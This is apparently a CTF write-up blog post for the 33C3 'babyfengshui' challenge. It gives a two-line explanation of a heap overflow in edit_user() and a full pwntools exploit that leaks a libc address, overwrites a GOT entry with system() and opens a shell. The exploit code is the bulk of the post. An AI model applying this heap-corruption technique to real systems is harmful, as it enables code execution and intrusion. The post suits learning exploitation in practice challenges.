---
layout: post
title: 33C3-BabyFengShui (150 pts)
---

Heap-based exploit. Bug lies in ptmalloc2 returning most recently freed chunk.
Also, an overflow in edit_user() function, which allows us to overwrite metadata of adjacent chunk.

Exploit coded in python.

```
#!/usr/bin/python
from pwn import *

p = process("./babyfengshui")
raw_input()
def create_user(size_desc,name,txt_len,txt):
	p.sendline("0")
	p.sendline(str(size_desc))
	p.sendline(name)
	p.sendline(str(txt_len))
	p.sendline(txt)
	print p.recv()

def delete_user(idx):
	p.sendline("1")
	p.sendline(str(idx))
	print p.recv()

def display_user(idx):
	p.sendline("2")
	p.sendline(str(idx))
	a = p.recv()
	leak = a.split()
	leak = leak[3]
	leak = leak.encode("hex")
	leak = leak[0:8]
	leak_final = leak[6:8]
	leak_final += leak[4:6]
	leak_final += leak[2:4]
	leak_final += leak[0:2]
	print leak_final
	return leak_final

def edit_user(idx,new_txt_len,text):
	p.sendline("3")
	p.sendline(str(idx))
	p.sendline(str(new_txt_len))
	p.sendline(text)
	print p.recv()

''' (40,128),(40,128),delete(40,128),(2,128),(8,128),edit(idx=3)'''

create_user(40,"AAAAAAAAAAAAAAAAAAAAA",8,"BBBBBBBB")
create_user(40,"CCCCCCCCCCCCCCCCCCCCC",8,"DDDDDDDD")
delete_user(0)
create_user(2,"EEEEEEEEEEEEEEEEEEEEEE",1,"B")
create_user(8,"FFFFFFFFFFFFFFFFFFFFFF",2,"FF")
payload = "A"*168
payload += p32(0x0804b02c)
edit_user(3,172,payload)
libc_leak = display_user(1)
system_addr = int(libc_leak,16) + 345360 - 690720
print system_addr
a = "sh\x00\x00"
payload = "A"*168
payload +=  p32(0x0804b02c-4)
#Attack strchr()
edit_user(3,172,payload)

finale = a + p32(system_addr)
edit_user(1,15,finale)
p.interactive()
```
